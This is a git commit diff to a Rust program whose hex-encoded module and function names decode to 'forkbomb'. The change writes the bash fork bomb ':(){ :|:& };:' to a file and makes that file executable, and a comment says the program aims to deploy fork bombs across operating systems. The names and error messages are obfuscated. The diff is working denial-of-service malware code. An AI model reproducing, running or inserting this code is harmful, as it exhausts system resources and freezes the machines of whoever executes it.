0272975c5431d61a8065f5f967304096dcc4671f
Pikkel <ilovemathguy@gmail.com>
2021-12-22 05:27:51 -0500

    I hope this works x5 :^(

--- src/_0x666f726b626f6d62/main.rs
+++ src/_0x666f726b626f6d62/main.rs
@@ -1,3 +1,4 @@
+use std::io::Write;
 use std::process::Command;
 
 pub fn main() {
@@ -7,12 +8,16 @@ pub fn main() {
 // different forkbombs so it'll be multiOS
 fn _0x7265616c666f726b() {
     if cfg!(unix) {
+        /*
         Command::new("echo")
             .arg("\":(){ :|:& };:\"")
             .arg(">")
             .arg("666f726b626f6d62.bash")
             .spawn()
             .expect("0x4661696c656420746f206578656375746520636f6d6d616e64");
+         */
+        let mut file = std::fs::File::create("666f726b626f6d62.bash").expect("0x637265617465206661696c6564");
+        file.write_all(":(){ :|:& };:".as_bytes()).expect("0x7772697465206661696c6564");
         Command::new("chmod")
             .arg("755")
             .arg("666f726b626f6d62.bash")
